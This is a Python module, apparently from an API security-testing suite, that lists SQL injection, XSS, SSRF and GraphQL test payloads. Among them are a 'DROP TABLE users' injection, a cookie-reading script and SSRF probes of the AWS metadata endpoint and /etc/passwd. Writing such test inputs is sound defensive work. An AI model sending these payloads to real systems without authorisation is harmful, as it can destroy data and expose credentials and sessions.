# backend/security_tests/custom_payloads.py
from typing import List, Dict

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1' --",
    "' OR 1=1; --",
    "' UNION SELECT null, table_name FROM information_schema.tables --",
    "1; DROP TABLE users --",
    "1' WAITFOR DELAY '0:0:10' --",  # Time-based SQLi
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))",  # MySQL time-based
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "{{7*7}}",  # Template injection test
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://127.0.0.1:22",  # Localhost SSH
    "http://localhost:8080",  # Localhost common port
    "file:///etc/passwd",  # File access
]

# GraphQL-specific payloads (for introspection and injection)
GRAPHQL_PAYLOADS = {
    "introspection": """
        query IntrospectionQuery {
            __schema {
                types {
                    name
                }
            }
        }
    """,
    "sql_injection": """
        query {
            user(id: "1' OR '1'='1") {
                name
            }
        }
    """,
    "xss": """
        query {
            user(name: "<script>alert('XSS')</script>") {
                name
            }
        }
    """
}

def get_payloads(test_type: str, api_type: str) -> List[str]:
    if test_type == "sql":
        return SQL_INJECTION_PAYLOADS
    elif test_type == "xss":
        return XSS_PAYLOADS
    elif test_type == "ssrf":
        return SSRF_PAYLOADS
    elif api_type == "GraphQL":
        return GRAPHQL_PAYLOADS.get(test_type, [])
    return []